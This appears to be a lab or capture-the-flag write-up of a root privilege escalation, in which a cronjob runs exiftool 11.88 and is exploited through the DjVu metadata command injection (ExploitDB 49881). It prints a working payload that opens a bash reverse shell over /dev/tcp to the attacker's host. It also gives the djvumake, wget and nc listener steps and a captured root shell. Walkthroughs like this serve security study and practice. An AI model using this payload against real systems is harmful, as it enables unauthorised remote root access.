# Exiftool Cronjob

When an cronjob with an exiftool binary is running with root perms.
We can assume it's vulnerable to "ExploitDB 49881". exiftool version 11.88 contains a command injection vulnerability when parsing DjVu metadata. This provided a privilege escalation path.

Created malicious script on my local machine.

```
cat exploit
(metadata "\c${system('bash -c \"bash -i >& /dev/tcp/192.168.45.164/22 0>&1\"')};")
```

I then created an .djvu file out of it and renamed it to .jpg

```
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit
mv exploit.djvu exploit.jpg
```

Next Step is to upload it onto the target /var/www/html/subrion/uploads.

On local machine

```
python3 -m http.server 80
```

On target machine.

```
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.45.164:8080/exploit.jpg
--2025-12-27 14:23:12--  http://192.168.45.164:8080/exploit.jpg
Connecting to 192.168.45.164:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 134 [image/jpeg]
Saving to: ‘exploit.jpg’

exploit.jpg                                         0%[                                                                                       exploit.jpg                                       100%[=============================================================================================================>]     134  --.-KB/s    in 0s      

2025-12-27 14:23:12 (19.3 MB/s) - ‘exploit.jpg’ saved [134/134]
```

Gave the exploit.jpg file executable rights.

```
chmod +x exploit.jpg
```

Started up listener on port 22.

```
nc -lvnp 22
```

Gained RCE as user "root" after some time.

```
nc -lvnp 22
listening on [any] 22 ...
connect to [192.168.45.164] from (UNKNOWN) [192.168.196.163] 37904
bash: cannot set terminal process group (3405): Inappropriate ioctl for device
bash: no job control in this shell
root@exfiltrated:~#
```
